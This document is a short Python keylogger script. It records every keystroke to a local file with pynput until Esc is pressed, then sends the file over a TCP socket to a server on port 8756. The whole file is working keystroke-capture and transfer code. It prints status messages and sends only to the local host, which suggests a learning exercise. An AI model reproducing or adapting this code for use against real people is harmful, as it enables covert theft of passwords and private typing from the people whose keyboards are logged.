import socket
from pynput.keyboard import Key, Listener
import logging

logdir = './'
file_name = 'keylog-res.txt'

logging.basicConfig(filename=logdir+file_name, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def pressing_key(key):
    logging.info(str(key))

def releasing_key(key):
    if key == Key.esc:
        return False

def transfer_data():

    print("\nConnecting to the server and sending the data...")

    csFT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    csFT.connect((socket.gethostname(), 8756))
        
    #Send file
    with open(file_name, 'rb') as fs:
        data = fs.read(1024)
        while data:
            csFT.send(data)
            data = fs.read(1024)

    csFT.close()
    
    print("\nThe data have been successfully sent\n")


if __name__ == "__main__":

    print("\nListening...\n")

    with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
        listener.join()
    transfer_data()